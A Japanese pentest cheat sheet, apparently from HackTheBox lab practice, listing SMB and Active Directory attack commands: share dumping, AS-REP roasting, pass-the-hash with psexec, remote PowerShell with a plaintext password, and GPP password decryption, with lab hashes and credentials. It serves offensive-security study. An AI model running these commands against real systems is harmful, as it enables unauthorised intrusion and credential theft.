# nmap
    sudo nmap -sVC -vv -n --script "safe or smb-enum-*" -p 139,445 10.129.1.171

# smbclient  

### 接続
    smbclient -L <ipaddr>
    smbclient \\\\10.129.138.203\\Replication

### 再起的にファイルを取得

    $ smbclient \\\\10.129.138.203\\Replication               
    Enter WORKGROUP\asai's password:
    Anonymous login successful
    Try "help" to get a list of possible commands.
    smb: \> recurse ON
    smb: \> prompt OFF
    smb: \> mget *
    getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
    getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
    getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
    getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (2.2 KiloBytes/sec) (average 0.7 KiloBytes/sec)
    getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (0.6 KiloBytes/sec) (average 0.7 KiloBytes/sec)
    getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (1.1 KiloBytes/sec) (average 0.7 KiloBytes/sec)
    getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (2.9 KiloBytes/sec) (average 1.1 KiloBytes/sec)


### passwordポリシーの取得

    crackmapexec smb 10.129.1.77 --pass-pol -u '' -p ''

### impacket

    python3 GetNPUsers.py -dc-ip 10.129.1.77 -request 'htb.local/' -format hashcat


### パスワードクラック



### ログイン

hashつかったログインが可能か確かめる
    crackmapexec smb 10.129.1.77 -u administrator -H aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6

psexec(hash)
aad3bからLMハッシュが始まる場合はblankなのでNTハッシュで埋める
    psexec.py -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.129.1.77

smbでログインできるけど何もできずローカルのログインはすでに別ユーザでできている場合

    $pass = ConvertTo-SecureString "36mEAhz/B8xQ~2VM" -AsPlainText -Force
    $pass
    System.Security.SecureString
    $cred = New-Object System.Management.Automation.PSCredential("Sniper\\Chris",$pass)
    Invoke-Command -ComputerName Sniper -Credential $cred -ScriptBlock {whoami}
### smbmap

再起的なディレクトリ検索
    smbmap -H 10.129.138.203 -R Replication

パターン検索ファイルのダウンロード
    smbmap -H 10.129.138.203 -R Replication -A Groups.xml -q

認証情報指定して検索
    smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.129.138.203

    gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
